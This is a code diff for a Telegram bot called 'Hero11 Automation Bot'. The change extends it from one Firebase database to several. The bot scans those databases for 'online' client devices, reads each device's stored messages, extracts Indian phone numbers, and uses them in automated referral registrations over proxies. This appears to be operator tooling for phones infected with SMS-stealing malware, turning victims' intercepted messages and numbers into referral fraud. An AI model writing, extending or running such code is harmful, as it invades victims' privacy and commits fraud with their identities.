@@ -31,9 +31,9 @@ TIMEOUT = 30
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher(storage=MemoryStorage())
 
-# In-memory storage for session configurations and running tasks control
+# In-memory storage supporting multiple Firebase URLs, max 1 code, and proxies
 USER_DATA = {
-    "firebase": None,
+    "firebase_dbs": [],
     "codes": [],  # Max length enforced to 1
     "proxies": [],
     "is_running": False,
@@ -48,19 +48,21 @@ class Form(StatesGroup):
 # ==============================================================================
 # 🛒 HERO11 ASYNC CLIENT ENGINE & HELPERS
 # ==============================================================================
-def parse_firebase_link(link: str):
-    link = link.strip()
-    if not link or link.startswith("#"):
-        return None
-    # Strip any accidental protocol or port trailing issues (e.g., .comhttps:443)
-    link = re.sub(r'https?://', '', link)
-    link = link.split('https:')[0].split('http:')[0].split(':')[0].strip('/')
-    if not link:
-        return None
-    clean_url = f"https://{link}/"
-    if "firebaseio.com" in clean_url or "firebasedatabase.app" in clean_url:
-        return clean_url
-    return None
+def parse_firebase_links(text: str):
+    found_links = []
+    # Split by lines, commas, or extract standard firebaseio patterns via regex
+    raw_parts = re.split(r'[\s,\n]+', text)
+    for part in raw_parts:
+        part = part.strip()
+        if not part or part.startswith("#"):
+            continue
+        part = re.sub(r'https?://', '', part)
+        part = part.split('https:')[0].split('http:')[0].split(':')[0].strip('/')
+        if part and ("firebaseio.com" in part or "firebasedatabase.app" in part):
+            clean_url = f"https://{part}/"
+            if clean_url not in found_links:
+                found_links.append(clean_url)
+    return found_links
 
 def extract_phone(messages_dict):
     text_data = str(messages_dict)
@@ -221,7 +223,7 @@ def get_main_menu():
             [InlineKeyboardButton(text="🛑 Stop Automation", callback_data="stop_automation")]
         ])
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔗 Add Firebase", callback_data="add_firebase"),
+        [InlineKeyboardButton(text="🔗 Add Firebase(s)", callback_data="add_firebase"),
          InlineKeyboardButton(text="🗑️ Clear Firebase", callback_data="clear_firebase")],
         [InlineKeyboardButton(text="📝 Add Refer Code (Max 1)", callback_data="add_codes"),
          InlineKeyboardButton(text="🌐 Add Proxies (HTTP)", callback_data="add_proxies")],
@@ -256,7 +258,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
     current_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "Not Set ❌"
     text = (
         "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
-        f"🔗 <b>Firebase:</b> {'Configured ✅ (' + USER_DATA['firebase'] + ')' if USER_DATA['firebase'] else 'Not Set ❌'}\n"
+        f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{current_code}</code>\n"
         f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded\n\n"
         "Select an option below:"
@@ -268,27 +270,27 @@ async def cb_add_firebase(callback: types.CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return
     await state.set_state(Form.waiting_for_firebase)
-    await callback.message.answer("🔗 Please send your Firebase RTDB link now:")
+    await callback.message.answer("🔗 Please send your Firebase RTDB link(s) (single or multiple, one per line or separated):")
     await callback.answer()
 
 @dp.message(Form.waiting_for_firebase)
 async def process_firebase_input(message: types.Message, state: FSMContext):
     if message.from_user.id != ADMIN_ID:
         return
-    parsed = parse_firebase_link(message.text)
-    if not parsed:
-        await message.answer("❌ Invalid Firebase URL. Try again:")
+    parsed_list = parse_firebase_links(message.text)
+    if not parsed_list:
+        await message.answer("❌ No valid Firebase URLs detected. Try again:")
         return
-    USER_DATA["firebase"] = parsed
+    USER_DATA["firebase_dbs"].extend([url for url in parsed_list if url not in USER_DATA["firebase_dbs"]])
     await state.clear()
-    await message.answer(f"✅ Firebase saved successfully!\n<code>{parsed}</code>", parse_mode="HTML", reply_markup=get_main_menu())
+    await message.answer(f"✅ Added successfully! Total Firebase databases loaded: {len(USER_DATA['firebase_dbs'])}", parse_mode="HTML", reply_markup=get_main_menu())
 
 @dp.callback_query(F.data == "clear_firebase")
 async def cb_clear_firebase(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
-    USER_DATA["firebase"] = None
-    await callback.message.answer("🗑️ <b>Firebase database cleared successfully!</b>", parse_mode="HTML", reply_markup=get_main_menu())
+    USER_DATA["firebase_dbs"] = []
+    await callback.message.answer("🗑️ <b>All Firebase databases cleared successfully!</b>", parse_mode="HTML", reply_markup=get_main_menu())
     await callback.answer()
 
 @dp.callback_query(F.data == "add_codes")
@@ -332,21 +334,25 @@ async def process_proxies_input(message: types.Message, state: FSMContext):
 async def cb_check_devices(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
-    if not USER_DATA["firebase"]:
-        await callback.answer("❌ Please add a Firebase link first!", show_alert=True)
+    if not USER_DATA["firebase_dbs"]:
+        await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
         return
 
-    await callback.message.answer("🔍 Scanning Firebase database for online devices...")
+    await callback.message.answer("🔍 Scanning all loaded Firebase databases for online devices...")
     try:
-        online_count = 0
+        total_online_count = 0
         import aiohttp
         async with aiohttp.ClientSession() as session:
-            async with session.get(f"{USER_DATA['firebase']}clients.json", timeout=10) as r:
-                clients_data = await r.json() or {}
-                for cid, cdata in clients_data.items():
-                    if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                        online_count += 1
-        await callback.message.answer(f"🟢 <b>Exact Online Devices Count:</b> {online_count}", parse_mode="HTML", reply_markup=get_main_menu())
+            for fb_url in USER_DATA["firebase_dbs"]:
+                try:
+                    async with session.get(f"{fb_url}clients.json", timeout=8) as r:
+                        clients_data = await r.json() or {}
+                        for cid, cdata in clients_data.items():
+                            if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                                total_online_count += 1
+                except Exception:
+                    pass
+        await callback.message.answer(f"🟢 <b>Total Exact Online Devices Count Across All DBs:</b> {total_online_count}", parse_mode="HTML", reply_markup=get_main_menu())
     except Exception as e:
         await callback.message.answer(f"❌ Error checking devices: {e}", reply_markup=get_main_menu())
     await callback.answer()
@@ -390,7 +396,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
     if USER_DATA["is_running"]:
         await callback.answer("⚠️ Automation is already running!", show_alert=True)
         return
-    if not USER_DATA["firebase"] or not USER_DATA["codes"]:
+    if not USER_DATA["firebase_dbs"] or not USER_DATA["codes"]:
         await callback.answer("❌ Please configure Firebase and add your 1 refer code first!", show_alert=True)
         return
 
@@ -398,7 +404,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
     status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Target: 2 registrations.", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
-        firebase_url = USER_DATA["firebase"]
+        firebase_dbs = USER_DATA["firebase_dbs"]
         current_code = USER_DATA["codes"][0]
         total_needed = 2
         success_count = 0
@@ -414,30 +420,35 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 total_online_count = 0
                 
                 async with aiohttp.ClientSession() as session:
-                    async with session.get(f"{firebase_url}clients.json", timeout=10) as r:
-                        clients_data = await r.json() or {}
+                    for firebase_url in firebase_dbs:
+                        try:
+                            async with session.get(f"{firebase_url}clients.json", timeout=8) as r:
+                                clients_data = await r.json() or {}
 
-                    for cid, cdata in clients_data.items():
-                        if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                            total_online_count += 1
-                            if cid not in skipped_phones and cid not in used_phones:
-                                try:
-                                    async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
-                                        msgs = await m_req.json()
-                                        phone = extract_phone(msgs) if msgs else None
-                                        if phone:
-                                            full_phone = "+91" + phone
-                                            if full_phone not in skipped_phones and full_phone not in used_phones:
-                                                online_targets.append({"cid": cid, "phone": full_phone})
-                                except Exception:
-                                    pass
+                            for cid, cdata in clients_data.items():
+                                if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                                    total_online_count += 1
+                                    if cid not in skipped_phones and cid not in used_phones:
+                                        try:
+                                            async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
+                                                msgs = await m_req.json()
+                                                phone = extract_phone(msgs) if msgs else None
+                                                if phone:
+                                                    full_phone = "+91" + phone
+                                                    if full_phone not in skipped_phones and full_phone not in used_phones:
+                                                        online_targets.append({"firebase_url": firebase_url, "cid": cid, "phone": full_phone})
+                                        except Exception:
+                                            pass
+                        except Exception:
+                            continue
 
                 if not online_targets:
-                    await logger.set_text("🔴 Exhausted online devices. Waiting for new devices...")
+                    await logger.set_text("🔴 Exhausted online devices across all databases. Waiting for new devices...")
                     await asyncio.sleep(5)
                     continue
 
                 target = online_targets[0]
+                firebase_url = target["firebase_url"]
                 cid = target["cid"]
                 phone = target["phone"]
                 used_phones.add(phone)
